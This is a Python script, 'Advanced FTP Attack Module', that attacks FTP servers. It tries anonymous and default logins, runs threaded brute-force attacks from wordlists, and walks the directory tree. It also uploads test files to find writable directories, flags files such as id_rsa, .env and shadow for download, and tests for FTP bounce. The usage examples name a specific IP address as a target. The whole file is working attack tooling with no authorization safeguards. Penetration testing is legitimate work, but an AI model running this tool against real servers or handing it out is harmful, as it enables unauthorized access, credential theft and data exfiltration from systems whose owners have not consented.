#!/usr/bin/env python3
"""
Advanced FTP Attack Module v1.0
Comprehensive FTP exploitation toolkit for security testing
"""

import argparse
import sys
import socket
import ftplib
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
from datetime import datetime
import os
import re
from urllib.parse import urlparse


@dataclass
class FTPTarget:
    """FTP target information"""
    host: str
    port: int = 21
    timeout: int = 10
    
    @staticmethod
    def from_url(target: str, default_port: int = 21) -> 'FTPTarget':
        """
        Create FTPTarget from URL, domain, or IP
        Supports: ftp://example.com, http://example.com, example.com, 192.168.1.1
        """
        # Handle ftp:// protocol URLs
        if '://' in target:
            parsed = urlparse(target)
            host = parsed.hostname or parsed.netloc or target
            port = parsed.port or default_port
        # Handle domain:port format (e.g., example.com:2121)
        elif ':' in target and not target.count(':') > 1:  # Not IPv6
            try:
                host, port_str = target.rsplit(':', 1)
                port = int(port_str)
            except ValueError:
                host = target
                port = default_port
        else:
            # Plain domain or IP
            host = target
            port = default_port
        
        return FTPTarget(host=host, port=port)


@dataclass
class FTPCredential:
    """FTP credential pair"""
    username: str
    password: str


@dataclass
class FTPVulnerability:
    """FTP vulnerability finding"""
    severity: str
    type: str
    details: str
    credential: Optional[FTPCredential] = None
    data: Optional[Dict] = None


class FTPAttacker:
    """Advanced FTP attack toolkit"""
    
    # Common FTP default credentials
    DEFAULT_CREDENTIALS = [
        ('anonymous', 'anonymous'),
        ('anonymous', 'guest'),
        ('anonymous', ''),
        ('anonymous', 'anonymous@'),
        ('ftp', 'ftp'),
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', ''),
        ('root', 'root'),
        ('root', 'password'),
        ('root', ''),
        ('test', 'test'),
        ('user', 'user'),
        ('guest', 'guest'),
    ]
    
    def __init__(self, target: FTPTarget, verbose: bool = False):
        self.target = target
        self.verbose = verbose
        self.vulnerabilities: List[FTPVulnerability] = []
        
    def log(self, message: str, level: str = "INFO"):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = {
            "INFO": "[*]",
            "SUCCESS": "[+]",
            "ERROR": "[!]",
            "WARNING": "[!]",
            "DEBUG": "[~]"
        }.get(level, "[*]")
        
        color = {
            "SUCCESS": "\033[92m",
            "ERROR": "\033[91m",
            "WARNING": "\033[93m",
            "INFO": "\033[94m",
            "DEBUG": "\033[90m"
        }.get(level, "")
        
        reset = "\033[0m" if color else ""
        print(f"{color}{prefix} [{timestamp}] {message}{reset}")
        
    def check_port_open(self) -> bool:
        """Check if FTP port is accessible"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.target.timeout)
            result = sock.connect_ex((self.target.host, self.target.port))
            sock.close()
            return result == 0
        except Exception as e:
            if self.verbose:
                self.log(f"Port check error: {e}", "DEBUG")
            return False
    
    def grab_banner(self) -> Optional[str]:
        """Grab FTP banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.target.timeout)
            sock.connect((self.target.host, self.target.port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner
        except Exception as e:
            if self.verbose:
                self.log(f"Banner grab error: {e}", "DEBUG")
            return None
    
    def test_connection(self, username: str, password: str) -> Tuple[bool, Optional[ftplib.FTP]]:
        """Test FTP connection with credentials"""
        try:
            ftp = ftplib.FTP(timeout=self.target.timeout)
            ftp.connect(self.target.host, self.target.port)
            ftp.login(username, password)
            return True, ftp
        except ftplib.error_perm as e:
            if self.verbose:
                self.log(f"Auth failed for {username}:{password} - {e}", "DEBUG")
            return False, None
        except Exception as e:
            if self.verbose:
                self.log(f"Connection error: {e}", "DEBUG")
            return False, None
    
    def test_anonymous_login(self) -> Optional[FTPCredential]:
        """Test for anonymous FTP access"""
        self.log("Testing anonymous FTP access...")
        
        anonymous_passwords = ['anonymous', 'guest', '', 'anonymous@', 'ftp@', 'user@']
        
        for password in anonymous_passwords:
            if self.verbose:
                self.log(f"Trying anonymous:{password if password else '(empty)'}", "DEBUG")
            
            success, ftp = self.test_connection('anonymous', password)
            if success:
                try:
                    # Test if we can list directory
                    ftp.cwd('.')
                    files = []
                    ftp.retrlines('LIST', files.append)
                    ftp.quit()
                    
                    self.log(f"ANONYMOUS ACCESS ENABLED! Password: {password if password else '(empty)'}", "WARNING")
                    
                    cred = FTPCredential('anonymous', password)
                    vuln = FTPVulnerability(
                        severity="CRITICAL",
                        type="Anonymous FTP Access",
                        details=f"FTP allows anonymous login with password: {password if password else '(empty)'}",
                        credential=cred,
                        data={'files_count': len(files)}
                    )
                    self.vulnerabilities.append(vuln)
                    
                    return cred
                except Exception as e:
                    if self.verbose:
                        self.log(f"Anonymous login succeeded but directory listing failed: {e}", "DEBUG")
                    ftp.quit()
        
        self.log("Anonymous access is disabled", "SUCCESS")
        return None
    
    def brute_force_single(self, username: str, password: str) -> Optional[FTPCredential]:
        """Test a single credential pair"""
        success, ftp = self.test_connection(username, password)
        if success:
            ftp.quit()
            return FTPCredential(username, password)
        return None
    
    def brute_force_attack(self, usernames: List[str], passwords: List[str], 
                          threads: int = 3) -> List[FTPCredential]:
        """Brute force FTP authentication"""
        self.log(f"Starting brute force attack with {len(usernames)} users and {len(passwords)} passwords")
        
        valid_creds = []
        total = len(usernames) * len(passwords)
        tested = 0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    future = executor.submit(self.brute_force_single, username, password)
                    futures.append(future)
            
            for future in as_completed(futures):
                tested += 1
                if tested % 20 == 0 or tested == total:
                    self.log(f"Progress: {tested}/{total} ({tested*100//total}%)", "DEBUG")
                
                result = future.result()
                if result:
                    self.log(f"Valid credentials found: {result.username}:{result.password}", "SUCCESS")
                    valid_creds.append(result)
                    
                    vuln = FTPVulnerability(
                        severity="CRITICAL",
                        type="Weak Credentials",
                        details=f"FTP accepts weak credentials: {result.username}:{result.password}",
                        credential=result
                    )
                    self.vulnerabilities.append(vuln)
        
        return valid_creds
    
    def test_default_credentials(self) -> List[FTPCredential]:
        """Test common default credentials"""
        self.log("Testing default credentials...")
        valid_creds = []
        
        for username, password in self.DEFAULT_CREDENTIALS:
            if username == 'anonymous':
                continue  # Skip anonymous, tested separately
                
            if self.verbose:
                self.log(f"Testing {username}:{password if password else '(empty)'}", "DEBUG")
            
            success, ftp = self.test_connection(username, password)
            if success:
                ftp.quit()
                cred = FTPCredential(username, password)
                valid_creds.append(cred)
                self.log(f"DEFAULT CREDENTIALS FOUND: {username}:{password if password else '(empty)'}", "SUCCESS")
                
                vuln = FTPVulnerability(
                    severity="CRITICAL",
                    type="Default Credentials",
                    details=f"FTP using default credentials: {username}:{password if password else '(empty)'}",
                    credential=cred
                )
                self.vulnerabilities.append(vuln)
        
        if not valid_creds:
            self.log("No default credentials found", "INFO")
        
        return valid_creds
    
    def enumerate_directory(self, ftp: ftplib.FTP, path: str = '/', max_depth: int = 3, 
                           current_depth: int = 0) -> Dict:
        """Recursively enumerate FTP directory structure"""
        if current_depth >= max_depth:
            return {'_truncated': 'Max depth reached'}
        
        structure = {}
        
        try:
            ftp.cwd(path)
            items = []
            ftp.retrlines('LIST', items.append)
            
            for item in items:
                # Parse LIST output (Unix format: drwxr-xr-x 2 user group 4096 Nov 25 12:34 dirname)
                parts = item.split()
                if len(parts) < 9:
                    continue
                
                permissions = parts[0]
                name = ' '.join(parts[8:])
                
                # Skip . and ..
                if name in ['.', '..']:
                    continue
                
                if permissions.startswith('d'):
                    # Directory
                    try:
                        subpath = f"{path}/{name}".replace('//', '/')
                        structure[name] = {
                            'type': 'directory',
                            'permissions': permissions,
                            'contents': self.enumerate_directory(ftp, subpath, max_depth, current_depth + 1)
                        }
                    except Exception as e:
                        structure[name] = {
                            'type': 'directory',
                            'permissions': permissions,
                            'error': str(e)
                        }
                else:
                    # File
                    try:
                        size = ftp.size(f"{path}/{name}".replace('//', '/'))
                    except:
                        size = 'unknown'
                    
                    structure[name] = {
                        'type': 'file',
                        'permissions': permissions,
                        'size': size
                    }
            
        except Exception as e:
            if self.verbose:
                self.log(f"Error enumerating {path}: {e}", "DEBUG")
        
        return structure
    
    def check_writable_directories(self, ftp: ftplib.FTP) -> List[str]:
        """Check for writable directories"""
        self.log("Testing for writable directories...")
        writable = []
        
        test_dirs = [
            '/',
            '/pub',
            '/public',
            '/upload',
            '/uploads',
            '/incoming',
            '/tmp',
            '/var/tmp',
            '/home',
        ]
        
        for test_dir in test_dirs:
            try:
                # Try to change to directory
                ftp.cwd(test_dir)
                
                # Try to create a test file
                test_filename = f'.__test_write_{datetime.now().timestamp()}'
                try:
                    # Use STOR command to test write
                    ftp.storbinary(f'STOR {test_filename}', open('/dev/null', 'rb'))
                    
                    # If we get here, write succeeded
                    writable.append(test_dir)
                    self.log(f"WRITABLE DIRECTORY FOUND: {test_dir}", "WARNING")
                    
                    # Clean up
                    try:
                        ftp.delete(test_filename)
                    except:
                        pass
                    
                    # Add vulnerability
                    vuln = FTPVulnerability(
                        severity="HIGH",
                        type="Writable Directory",
                        details=f"FTP directory is writable: {test_dir} - Could upload malicious files",
                        data={'path': test_dir}
                    )
                    self.vulnerabilities.append(vuln)
                    
                except Exception:
                    pass
                    
            except Exception:
                continue
        
        if not writable:
            self.log("No writable directories found", "INFO")
        
        return writable
    
    def search_sensitive_files(self, structure: Dict, path: str = '/') -> List[Dict]:
        """Search for sensitive files in directory structure"""
        sensitive_patterns = [
            r'\.sql$',
            r'\.bak$',
            r'\.conf$',
            r'\.config$',
            r'\.ini$',
            r'\.env$',
            r'password',
            r'passwd',
            r'shadow',
            r'private',
            r'secret',
            r'key',
            r'\.pem$',
            r'\.key$',
            r'id_rsa',
            r'config\.php',
            r'wp-config',
            r'\.git',
        ]
        
        sensitive_files = []
        
        def search_recursive(struct: Dict, current_path: str):
            for name, info in struct.items():
                if name == '_truncated':
                    continue
                
                full_path = f"{current_path}/{name}".replace('//', '/')
                
                if isinstance(info, dict):
                    if info.get('type') == 'file':
                        # Check if filename matches sensitive pattern
                        for pattern in sensitive_patterns:
                            if re.search(pattern, name.lower()):
                                sensitive_files.append({
                                    'path': full_path,
                                    'name': name,
                                    'size': info.get('size'),
                                    'permissions': info.get('permissions'),
                                    'pattern': pattern
                                })
                                break
                    elif info.get('type') == 'directory' and 'contents' in info:
                        search_recursive(info['contents'], full_path)
        
        search_recursive(structure, path)
        return sensitive_files
    
    def download_file(self, ftp: ftplib.FTP, remote_path: str, local_path: str) -> bool:
        """Download file from FTP"""
        try:
            with open(local_path, 'wb') as f:
                ftp.retrbinary(f'RETR {remote_path}', f.write)
            return True
        except Exception as e:
            if self.verbose:
                self.log(f"Error downloading {remote_path}: {e}", "DEBUG")
            return False
    
    def test_bounce_attack(self, ftp: ftplib.FTP, target_host: str, target_port: int) -> bool:
        """Test FTP bounce attack vulnerability"""
        self.log(f"Testing FTP bounce attack to {target_host}:{target_port}...")
        
        try:
            # Convert IP to FTP PORT format
            ip_parts = target_host.split('.')
            port_high = target_port // 256
            port_low = target_port % 256
            
            port_cmd = f"{ip_parts[0]},{ip_parts[1]},{ip_parts[2]},{ip_parts[3]},{port_high},{port_low}"
            
            # Try PORT command
            response = ftp.sendcmd(f'PORT {port_cmd}')
            
            if '200' in response:
                self.log("FTP BOUNCE ATTACK POSSIBLE!", "WARNING")
                vuln = FTPVulnerability(
                    severity="HIGH",
                    type="FTP Bounce Attack",
                    details="FTP server allows bounce attacks - can be used to scan internal networks",
                    data={'response': response}
                )
                self.vulnerabilities.append(vuln)
                return True
            
        except Exception as e:
            if self.verbose:
                self.log(f"Bounce attack test failed: {e}", "DEBUG")
        
        self.log("FTP bounce attack not possible", "INFO")
        return False
    
    def full_enumeration(self, ftp: ftplib.FTP, download_sensitive: bool = False) -> Dict:
        """Full FTP enumeration"""
        self.log("Starting full FTP enumeration...")
        
        enum_data = {
            'directory_structure': {},
            'writable_directories': [],
            'sensitive_files': [],
            'system_info': {}
        }
        
        # Get system info
        try:
            response = ftp.sendcmd('SYST')
            enum_data['system_info']['system'] = response
            self.log(f"System: {response}", "INFO")
        except Exception as e:
            enum_data['system_info']['system'] = f"Error: {e}"
        
        try:
            response = ftp.sendcmd('STAT')
            enum_data['system_info']['status'] = response
        except Exception as e:
            enum_data['system_info']['status'] = f"Error: {e}"
        
        # Enumerate directory structure
        self.log("Enumerating directory structure...")
        enum_data['directory_structure'] = self.enumerate_directory(ftp, '/', max_depth=3)
        
        # Check for writable directories
        enum_data['writable_directories'] = self.check_writable_directories(ftp)
        
        # Search for sensitive files
        self.log("Searching for sensitive files...")
        enum_data['sensitive_files'] = self.search_sensitive_files(enum_data['directory_structure'])
        
        if enum_data['sensitive_files']:
            self.log(f"Found {len(enum_data['sensitive_files'])} sensitive files!", "WARNING")
            for file_info in enum_data['sensitive_files'][:10]:  # Show first 10
                self.log(f"  - {file_info['path']} ({file_info.get('size', 'unknown')} bytes)", "WARNING")
            
            vuln = FTPVulnerability(
                severity="HIGH",
                type="Sensitive File Exposure",
                details=f"Found {len(enum_data['sensitive_files'])} sensitive files accessible via FTP",
                data={'files': enum_data['sensitive_files']}
            )
            self.vulnerabilities.append(vuln)
        
        # Test bounce attack
        self.test_bounce_attack(ftp, '127.0.0.1', 80)
        
        return enum_data
    
    def generate_report(self, output_file: str = None) -> Dict:
        """Generate comprehensive report"""
        report = {
            'target': {
                'host': self.target.host,
                'port': self.target.port
            },
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0
            }
        }
        
        for vuln in self.vulnerabilities:
            vuln_dict = {
                'severity': vuln.severity,
                'type': vuln.type,
                'details': vuln.details
            }
            
            if vuln.credential:
                vuln_dict['credential'] = {
                    'username': vuln.credential.username,
                    'password': vuln.credential.password
                }
            
            if vuln.data:
                vuln_dict['data'] = vuln.data
            
            report['vulnerabilities'].append(vuln_dict)
            
            # Count by severity
            severity = vuln.severity.upper()
            if severity == 'CRITICAL':
                report['summary']['critical'] += 1
            elif severity == 'HIGH':
                report['summary']['high'] += 1
            elif severity == 'MEDIUM':
                report['summary']['medium'] += 1
            else:
                report['summary']['low'] += 1
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2, default=str)
            self.log(f"Report saved to: {output_file}", "SUCCESS")
        
        return report
    
    def run_comprehensive_attack(self, test_anonymous: bool = True,
                                test_defaults: bool = True,
                                brute_force: bool = False,
                                usernames: List[str] = None,
                                passwords: List[str] = None,
                                enumerate: bool = True) -> Dict:
        """Run comprehensive FTP attack"""
        
        self.log(f"Starting FTP attack against {self.target.host}:{self.target.port}")
        self.log("="*60)
        
        # Check if port is open
        self.log("Checking if FTP port is accessible...")
        if not self.check_port_open():
            self.log(f"Port {self.target.port} is not accessible", "ERROR")
            return {'error': 'Port not accessible'}
        
        self.log(f"Port {self.target.port} is OPEN", "SUCCESS")
        
        # Grab banner
        banner = self.grab_banner()
        if banner:
            self.log(f"Banner: {banner}", "INFO")
        
        # Test anonymous access
        valid_creds = []
        if test_anonymous:
            anon_cred = self.test_anonymous_login()
            if anon_cred:
                valid_creds.append(anon_cred)
        
        # Test default credentials
        if test_defaults:
            default_creds = self.test_default_credentials()
            valid_creds.extend(default_creds)
        
        # Brute force attack
        if brute_force and usernames and passwords:
            brute_creds = self.brute_force_attack(usernames, passwords)
            valid_creds.extend(brute_creds)
        
        # If we have valid credentials, enumerate
        if valid_creds and enumerate:
            self.log("="*60)
            self.log("CREDENTIALS FOUND - Starting enumeration", "SUCCESS")
            
            cred = valid_creds[0]  # Use first valid credential
            success, ftp = self.test_connection(cred.username, cred.password)
            
            if success:
                enum_data = self.full_enumeration(ftp)
                ftp.quit()
                
                return {
                    'banner': banner,
                    'valid_credentials': [(c.username, c.password) for c in valid_creds],
                    'enumeration': enum_data,
                    'vulnerabilities': self.vulnerabilities
                }
        
        return {
            'banner': banner,
            'valid_credentials': [(c.username, c.password) for c in valid_creds],
            'vulnerabilities': self.vulnerabilities
        }


def main():
    parser = argparse.ArgumentParser(
        description='Advanced FTP Attack Module v1.0 - Works with URLs, domains, and IPs',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test anonymous and default credentials - IP
  python3 ftp_attack.py 64.31.47.162
  
  # Test with URL or domain
  python3 ftp_attack.py ftp://example.com
  python3 ftp_attack.py example.com
  
  # Full enumeration if credentials found
  python3 ftp_attack.py example.com --enumerate
  
  # Brute force attack
  python3 ftp_attack.py example.com --brute-force -U usernames.txt -P passwords.txt
  
  # Custom port
  python3 ftp_attack.py example.com --port 2121
  
  # Save report
  python3 ftp_attack.py example.com -o ftp_report.json
        """
    )
    
    parser.add_argument('host', help='Target FTP host, URL, domain, or IP')
    parser.add_argument('--port', type=int, default=21, help='FTP port (default: 21)')
    parser.add_argument('--timeout', type=int, default=10, help='Connection timeout (default: 10)')
    parser.add_argument('--no-anonymous', action='store_true', help='Skip anonymous login test')
    parser.add_argument('--no-defaults', action='store_true', help='Skip default credential test')
    parser.add_argument('--brute-force', action='store_true', help='Enable brute force attack')
    parser.add_argument('-U', '--usernames', help='File with usernames (one per line)')
    parser.add_argument('-P', '--passwords', help='File with passwords (one per line)')
    parser.add_argument('--threads', type=int, default=3, help='Threads for brute force (default: 3)')
    parser.add_argument('--enumerate', action='store_true', help='Full FTP enumeration')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output JSON report file')
    
    args = parser.parse_args()
    
    # Create target with URL support
    target = FTPTarget.from_url(args.host, args.port)
    target.timeout = args.timeout
    
    print(f"\n📁 FTP Attack Module")
    print(f"Target: {args.host}")
    print(f"Host: {target.host}:{target.port}\n")
    
    # Create attacker
    attacker = FTPAttacker(target, verbose=args.verbose)
    
    # Load username/password lists if provided
    usernames = []
    passwords = []
    
    if args.brute_force:
        if not args.usernames or not args.passwords:
            print("[!] Brute force requires -U and -P arguments")
            sys.exit(1)
        
        try:
            with open(args.usernames) as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Error reading usernames: {e}")
            sys.exit(1)
        
        try:
            with open(args.passwords) as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Error reading passwords: {e}")
            sys.exit(1)
    
    # Run attack
    try:
        results = attacker.run_comprehensive_attack(
            test_anonymous=not args.no_anonymous,
            test_defaults=not args.no_defaults,
            brute_force=args.brute_force,
            usernames=usernames,
            passwords=passwords,
            enumerate=args.enumerate
        )
        
        # Generate report
        print("\n" + "="*60)
        print("SCAN COMPLETE")
        print("="*60)
        
        if 'error' in results:
            print(f"[!] Error: {results['error']}")
        else:
            print(f"[+] Vulnerabilities found: {len(attacker.vulnerabilities)}")
            
            if results.get('valid_credentials'):
                print(f"[+] Valid credentials: {len(results['valid_credentials'])}")
                for user, pwd in results['valid_credentials']:
                    print(f"    - {user}:{pwd if pwd else '(empty)'}")
            
            if args.output:
                attacker.generate_report(args.output)
        
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
